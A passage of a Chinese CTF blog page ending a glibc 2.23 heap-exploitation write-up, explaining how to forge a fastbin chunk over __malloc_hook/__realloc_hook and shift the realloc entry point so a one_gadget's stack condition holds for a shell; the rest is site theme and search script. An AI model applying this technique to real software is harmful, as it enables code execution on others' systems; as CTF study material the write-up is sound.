+<p>(2)而0xf0可以改变，只要比fastbins_MAX大就行，那么对应的0x170也需要改变，同时也要改变0x120。</p>
+<p>(3)申请fakechunk步骤中的’\0’*11也是需要通过调试算出来，方法就是gdb查看realloc_hook-0xxx附近的内存，选择合适的可以伪造size的地址，之后通过填充padding来覆盖realloc_hook和malloc_hook。</p>
+<p>(4)onegadget相关的+16也得通过调试才能知道，这里选取的onegadget条件是[rsp+0x30]==Null。所以调试时将断点下在__libc_realloc函数上，进入__libc_realloc函数，从而一直进入到onegadget的执行代码中，如下：</p>
+<p>先下断点让程序运行到这<img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191536075.jpeg" alt="img"></p>
+<p>再输入ni进入:<img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191537426.jpeg" alt="img"></p>
+<p>这时候就可以看rsp的值了：<img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191536542.jpeg" alt="img"></p>
+<p>这里的rsp是0x7ffca3331eb8，rsp+0x30=0x7ffca3331ee8，对应图中的值就得是0才满足条件(这里已经计算过了，+16)</p>
+<p>▲如果从最开始进入__libc_realloc函数，进入到onegadget中之后，发现条件不满足，那么需要观察前后的值，从而决定从哪里进入__libc_realloc函数才能使得rsp满足。<img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191536192.jpeg" alt="img"></p>
+<p>因为__libc_realloc(就是realloc)函数有一堆的push和sub操作，少一个push，那么rsp就可以下挪0x08，相当于rsp+0x08，中间还有sub rsp,xxh，相当于上挪rsp。所以决定从哪里进入realloc函数决定了onegadget的成功与否。<img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191536822.jpeg" alt="img"></p>
+<p>而通过汇编代码可以看到，实际的onegaget是通过0x84724 mov rax,cs:__realloc_hook_ptr传进来，之后由于</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">test rax rax</span><br><span class="line">jnz  loc_84958</span><br></pre></td></tr></table></div></figure>
+
+<p>rax不为0，必定跳转loc_84958:</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191538482.jpeg" alt="img"></p>
+<p>这里才是我们选择调用进入onegadget的入口。所以之前在__libc_realloc的计算都是为了调整栈帧，不然其实如果栈帧不用调整就可以满足，那么我们可以直接将malloc_hook改成onegadget也可以直接getshell。因为__libc_malloc函数中的汇编代码也是类似的：</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191536213.jpeg" alt="img"></p>
+<p>而且这还是一个无条件跳转。</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191536275.jpeg" alt="img"></p>
+<p>可以看到有两个push,一个sub rsp,8;两个Pop。相当于只要在call malloc之前，我们的rsp+0x28==NULL即可满足onegadget的rsp+0x30==NULL的条件。当然，以上只是在Libc2.23下的，如果是其它版本的libc就可能不太一样。</p>
+</div></div></article></section><nav class="paginator"><div class="paginator-inner"><a class="extend prev" rel="prev" href="/page/6/"><i class="fas fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><span class="page-number current">7</span><a class="page-number" href="/page/8/">8</a><span class="space">&hellip;</span><a class="page-number" href="/page/10/">10</a><a class="extend next" rel="next" href="/page/8/"><i class="fas fa-angle-right"></i></a></div></nav></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><section class="sidebar-toc hide"></section><!-- ov = overview--><section class="sidebar-ov"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsauthor.jpg" alt="avatar"></div><p class="sidebar-ov-author__text">hello world</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">93</div><div class="sidebar-ov-state-item__name">Archives</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">40</div><div class="sidebar-ov-state-item__name">Categories</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">43</div><div class="sidebar-ov-state-item__name">Tags</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="Creative Commons" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2021</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>PIG-007</span></div><div><span>Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a></span><span> v5.4.0</span><span class="footer__devider">|</span><span>Theme - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.6.2</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><div class="search-mask"></div><div class="search-popup"><span class="search-close"></span><div class="search-input"><input placeholder="Search for Posts (Support multiple keywords)"></div><div class="search-results"></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script>function initSearch() {
+  var isXML = true;
+  var search_path = 'search.json';
+
+  if (!search_path) {
+    search_path = 'search.xml';
+  } else if (/json$/i.test(search_path)) {
+    isXML = false;
+  }
+
+  var path = '/' + search_path;
+  $.ajax({
+    url: path,
+    dataType: isXML ? 'xml' : 'json',
+    async: true,
+    success: function (res) {
+      var datas = isXML ? $('entry', res).map(function () {
+        // 将 XML 转为 JSON
+        return {
+          title: $('title', this).text(),
+          content: $('content', this).text(),
+          url: $('url', this).text()
+        };
+      }).get() : res;
+      var $input = $('.search-input input');
+      var $result = $('.search-results');
+      // 搜索对象（标题、内容）的权重，影响显示顺序
+      var WEIGHT = { title: 100, content: 1 };
+      var searchPost = function () {
+        var searchText = $input.val().toLowerCase().trim();
+        // 根据空白字符分隔关键字
+        var keywords = searchText.split(/[\s]+/);
+        // 搜索结果
+        var matchPosts = [];
+
+        // 有多个关键字时，将原文字整个保存下来
+        if (keywords.length > 1) {
+          keywords.push(searchText);
+        }
+        // 防止未输入字符时搜索
+        if (searchText.length > 0) {
+          datas.forEach(function (data) {
+            var isMatch  = false;
+            // 没有标题的文章使用预设的 i18n 变量代替
+            var title = (data.title && data.title.trim()) || '[ Untitled ]';
+            var titleLower = title && title.toLowerCase();
+            // 删除 HTML 标签 和 所有空白字符
+            var content = data.content && data.content.replace(/<[^>]+>/g, '');
+            var contentLower = content && content.toLowerCase();
+            // 删除重复的 /
+            var postURL = data.url && decodeURI(data.url).replace(/\/{2,}/g, '/');
+            // 标题中匹配到的关键词
+            var titleHitSlice = [];
+            // 内容中匹配到的关键词
+            var contentHitSlice = [];
+
+            keywords.forEach(function (keyword) {
+              /**
+              * 获取匹配的关键词的索引
+              * @param {String} keyword 要匹配的关键字
+              * @param {String} text 原文字
+              * @param {Boolean} caseSensitive 是否区分大小写
+              * @param {Number} weight 匹配对象的权重。权重大的优先显示
+              * @return {Array}
+              */
+              function getIndexByword (word, text, caseSensitive, weight) {
+                if (!word || !text) {
+                  return [];
+                };
+
+                var startIndex = 0; // 每次匹配的开始索引
+                var index = -1;     // 匹配到的索引值
+                var result = [];    // 匹配结果
+
+                if (!caseSensitive) {
+                  word = word.toLowerCase();
+                  text = text.toLowerCase();
+                }
+
+                while((index = text.indexOf(word, startIndex)) !== -1) {
+                  var hasMatch = false;
+                  // 索引位置相同的关键词，保留长度较长的
+                  titleHitSlice.forEach(function (hit) {
+                    if (hit.index === index && hit.word.length < word.length) {
+                      hit.word = word;
+                      hasMatch = true;
+                    }
+                  });
+                  startIndex = index + word.length;
+                  !hasMatch && result.push({ index: index, word: word, weight: weight });
+                }
+                return result;
+              }
+              titleHitSlice = titleHitSlice.concat(getIndexByword(keyword, titleLower, false, WEIGHT.title));
+              contentHitSlice = contentHitSlice.concat(getIndexByword(keyword, contentLower, false, WEIGHT.content));
+            });
+
+            var hitTitle = titleHitSlice.length;
+            var hitContent = contentHitSlice.length;
+
+            if (hitTitle > 0 || hitContent > 0) {
+              isMatch = true;
+            }
+            if (isMatch) {
+              ;[titleHitSlice, contentHitSlice].forEach(function (hit) {
+                // 按照匹配文字的索引的递增顺序排序
+                hit.sort(function (left, right) {
+                  return left.index - right.index;
+                });
+              });
+              /**
+              * 给文本中匹配到的关键词添加标记，从而进行高亮显示
+              * @param {String} text 原文本
+              * @param {Array} hitSlice 匹配项的索引信息
+              * @param {Number} start 开始索引
+              * @param {Number} end 结束索引
+              * @return {String}
+              */
+              function highlightKeyword (text, hitSlice, start, end) {
+                if (!text || !hitSlice || !hitSlice.length) {
+                  return;
+                }
+
+                var result = '';
+                var startIndex = start;
+                var endIndex = end;
+                hitSlice.forEach(function (hit) {
+                  if (hit.index < startIndex) {
+                    return;
+                  }
+
+                  var hitWordEnd = hit.index + hit.word.length;
+                  result += text.slice(startIndex, hit.index);
+                  result += '<b>' + text.slice(hit.index, hitWordEnd) + '</b>';
+                  startIndex = hitWordEnd;
+                });
+                result += text.slice(startIndex, endIndex);
+                return result;
+              }
+
+              var postData = {};
+              // 文章总的搜索权重
+              var postWeight = titleHitSlice.length * WEIGHT.title + contentHitSlice.length * WEIGHT.content;
+              // 标记匹配关键词后的标题
+              var postTitle = highlightKeyword(title, titleHitSlice, 0, title.length) || title;
+              // 标记匹配关键词后的内容
+              var postContent;
+              // 显示内容的长度
+              var SHOW_WORD_LENGTH = 200;
+              // 命中关键词前的字符显示长度
+              var SHOW_WORD_FRONT_LENGTH = 20;
+              var SHOW_WORD_END_LENGTH = SHOW_WORD_LENGTH - SHOW_WORD_FRONT_LENGTH;
+
+              // 截取匹配的第一个字符，前后共 200 个字符来显示
+              if (contentHitSlice.length > 0) {
+                var firstIndex = contentHitSlice[0].index;
+                var start = firstIndex > SHOW_WORD_FRONT_LENGTH ? firstIndex - SHOW_WORD_FRONT_LENGTH : 0;
+                var end = firstIndex + SHOW_WORD_END_LENGTH;
+                postContent = highlightKeyword(content, contentHitSlice, start, end);
+              } else { // 未匹配到内容，直接截取前 200 个字符来显示
+                postContent = content.slice(0, SHOW_WORD_LENGTH);
+              }
+              postData.title = postTitle;
+              postData.content = postContent;
+              postData.url = postURL;
+              postData.weight = postWeight;
+              matchPosts.push(postData);
+            }
+          });
+        }
+
+        var resultInnerHtml = '';
+        if (matchPosts.length) {
+          // 按权重递增的顺序排序，使权重大的优先显示
+          matchPosts.sort(function (left, right) {
+            return right.weight - left.weight;
+          });
+          resultInnerHtml += '<ul>';
+          matchPosts.forEach(function (post) {
+            resultInnerHtml += '<li><a class="search-results-title" href="' + post.url + '">';
+            resultInnerHtml += post.title;
+            resultInnerHtml += '</a><div class="search-results-content">';
+            resultInnerHtml += post.content;
+            resultInnerHtml += '</div></li>';
+          });
+          resultInnerHtml += '</ul>';
+        } else {
+          resultInnerHtml += '<div class="search-results-none"><i class="far fa-meh"></i></div>';
+        }
+        $result.html(resultInnerHtml);
+      };
+      $input.on('input', searchPost);
+      $input.on('keyup', function (e) {
+        if (e.keyCode === Stun.utils.codeToKeyCode('Enter')) {
+          searchPost();
+        }
+      });
+    }
+  });
+}
+
+function closeSearch () {
+  $('body').css({ overflow: 'auto' });
+  $('.search-popup').css({ display: 'none' });
+  $('.search-mask').css({ display: 'none' });
+}
+
+window.addEventListener('DOMContentLoaded', function () {
+  Stun.utils.pjaxReloadLocalSearch = function () {
+    $('.header-nav-search').on('click', function (e) {
+      e.stopPropagation();
+      $('body').css('overflow', 'hidden');
+      $('.search-popup')
+        .velocity('stop')
+        .velocity('transition.expandIn', {
+          duration: 300,
+          complete: function () {
+            $('.search-popup input').focus();
+          }
+        });
+      $('.search-mask')
+        .velocity('stop')
+        .velocity('transition.fadeIn', {
+          duration: 300
+        });
+
+      initSearch();
+    });
+    $('.search-mask, .search-close').on('click', function () {
+      closeSearch();
+    });
+    $(document).on('keydown', function (e) {
+      // Escape <=> 27
+      if (e.keyCode === Stun.utils.codeToKeyCode('Escape')) {
+        closeSearch();
+      }
+    });
+  };
+
+  Stun.utils.pjaxReloadLocalSearch();
+}, false);
+
+function safeOpenUrl(url) {
+  var newTab = window.open();
+  newTab.opener = null;
+  newTab.location = url;
+}
+
+function extSearch(engine) {
+  var engines = {
+    google: 'https://www.google.com/search?q=',
+    bing: 'https://cn.bing.com/search?q=',
+    baidu: 'https://www.baidu.com/s?ie=UTF-8&wd=',
+  };
+  var host = window.location.host;
+  var query = $('.search-input input').val().toLowerCase().trim();
+  var uri = engines[engine] + query + ' site:' + host;
+
+  if (query) {
+    safeOpenUrl(uri);
+  } else {
+    Stun.utils.popAlert('warning', 'Please enter characters');
+  }
+}
+
+var assistSearchList = window.CONFIG.assistSearch;
+
+if (Array.isArray(assistSearchList)) {
+  assistSearchList.forEach(function (name) {
+    document.querySelector('.search-btns-item--' + name).addEventListener('click', function () {
+      extSearch(name);
+    }, false);
+  });
+}</script><script src="/js/utils.js?v=2.6.2"></script><script src="/js/stun-boot.js?v=2.6.2"></script><script src="/js/scroll.js?v=2.6.2"></script><script src="/js/header.js?v=2.6.2"></script><script src="/js/sidebar.js?v=2.6.2"></script><script type="application/json" src="/search.json"></script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"scale":1,"hHeadPos":0.5,"vHeadPos":0.618,"jsonPath":"/live2dw/assets/assets/wanko.model.json"},"display":{"superSample":2,"width":150,"height":300,"position":"left","hOffset":0,"vOffset":-80},"mobile":{"show":true,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.8},"log":false});</script></body></html>
